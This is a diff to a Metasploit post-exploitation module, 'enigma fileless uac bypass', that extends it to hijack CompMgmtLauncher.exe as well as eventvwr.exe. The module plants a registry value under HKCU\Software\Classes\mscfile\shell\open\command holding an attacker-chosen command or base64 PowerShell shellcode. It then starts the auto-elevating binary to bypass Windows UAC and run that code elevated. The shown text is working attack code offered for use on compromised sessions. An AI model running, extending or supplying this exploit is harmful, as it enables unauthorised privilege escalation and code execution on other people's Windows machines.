@@ -39,6 +39,7 @@
 # Check target vulnerability settings/status?  => set CHECK_VULN true
 # Delete malicious registry hive keys/values?  => set DEL_REGKEY true
 # Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
+# The binary.exe vulnerable?                   => set VUL_SOFT CompMgmtLauncher.exe
 # ---
 # HINT: To deploy a powershell payload (shellcode string) we need to set the option
 # 'USE_POWERSHELL true' and input the base64 encoded 'shellcode' into 'EXEC_COMMAND'
@@ -95,7 +96,7 @@ require 'msf/core/post/windows/registry'
 # ----------------------------------
 class MetasploitModule < Msf::Post
       Rank = ExcellentRanking
- 
+
          include Msf::Post::Common
          include Msf::Post::Windows::Priv
          include Msf::Post::Windows::Error
@@ -111,7 +112,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'enigma fileless uac bypass [RCE]',
                         'Description'   => %q{
-                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe (hijacking the process being started to gain code execution).
+                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe OR CompMgmtLauncher.exe (hijacking the process being started to gain code execution).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -120,8 +121,8 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover : enigma0x3 | mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.7',
-                        'DisclosureDate' => 'jan 8 2017',
+                        'Version'        => '$Revision: 1.9',
+                        'DisclosureDate' => 'mar 16 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false', # thats no need for privilege escalation..
@@ -135,13 +136,15 @@ class MetasploitModule < Msf::Post
                                 [
                                          [ 'URL', 'POC: goo.gl/XHQ6aF' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it' ],
+                                         [ 'URL', 'http://x42.obscurechannel.com/?p=368' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
 
 
                                 ],
 			'DefaultOptions' =>
 				{
-                                         'SESSION' => '1', # Default its to run againts session 1
+                                         'SESSION' => '1',            # Default its to run againts session 1
+                                         'VUL_SOFT'=> 'eventvwr.exe', # Default its to run againts eventvwr.exe
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -156,11 +159,13 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
+                                OptString.new('VUL_SOFT', [ false, 'The binary.exe vulnerable (eg CompMgmtLauncher.exe)']),
                                 OptBool.new('USE_POWERSHELL', [ false, 'Execute powershell shellcode insted of a cmd command?' , false]),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                         ], self.class) 
 
         end
+
 
 
 
@@ -180,7 +185,8 @@ else
 end
 
   r=''
-  vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
+  vul_serve = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
+  # vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
   exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
@@ -352,7 +358,8 @@ def ls_stage3
   r=''
   session = client
   oscheck = client.fs.file.expand_path("%OS%")
-  vuln_soft = "eventvwr.exe" # vulnerable software name
+  vuln_soft = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
+  # vuln_soft = "eventvwr.exe" # vulnerable software name
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   vuln_hive = "HKCR\\mscfile\\shell\\open\\command" # vulnerable hive key call (mmc.exe)
   vuln_key = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # vuln hijack key
